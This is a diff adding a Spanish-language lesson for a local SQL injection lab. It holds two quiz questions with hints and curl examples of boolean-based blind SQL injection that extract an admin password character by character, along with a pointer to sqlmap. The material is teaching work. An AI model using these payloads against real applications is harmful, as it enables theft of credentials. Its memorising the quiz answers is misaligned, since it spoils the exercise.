@@ -1,0 +1,32 @@
+---
+index: 4
+title: "Lab: Blind SQL Injection"
+questions:
+  - id: sqli-basico-t04-q01
+    prompt: "¿Qué diferencia visible hay entre TRUE y FALSE en un blind SQLi boolean-based?"
+    hint: "La página muestra 'User exists' vs 'User not found'."
+    kind: text
+  - id: sqli-basico-t04-q02
+    prompt: "En blind SQLi, ¿cómo extraes datos carácter a carácter sin verlos directamente?"
+    hint: "Usando SUBSTR + CASE WHEN: cada carácter se deduce por la respuesta TRUE/FALSE."
+    kind: text
+---
+
+## Blind SQLi: cuando no hay errores ni datos
+
+El lab blind NO muestra errores ni datos — solo "User exists" o "not found".
+Pero esa diferencia ES un oráculo que puede extraer toda la base de datos:
+
+```bash
+# ¿La tabla users tiene más de 0 filas?
+curl "http://127.0.0.1:18092/check?id=1+OR+(SELECT+COUNT(*)+FROM+users)>0"
+# → "User exists" (TRUE)
+
+# ¿El primer carácter del password de admin es 'a'?
+curl "http://127.0.0.1:18092/check?id=(SELECT+CASE+WHEN+(SUBSTR(password,1,1)='a')+THEN+1+ELSE+99+END+FROM+users+WHERE+id=1)"
+# → "not found" (FALSE: no es 'a')
+
+# Prueba con 'p'... 'pa'... 'pas'... hasta extraer el password completo
+```
+
+Esto es lo que hace sqlmap automáticamente con `--technique=B` (Boolean-based blind).
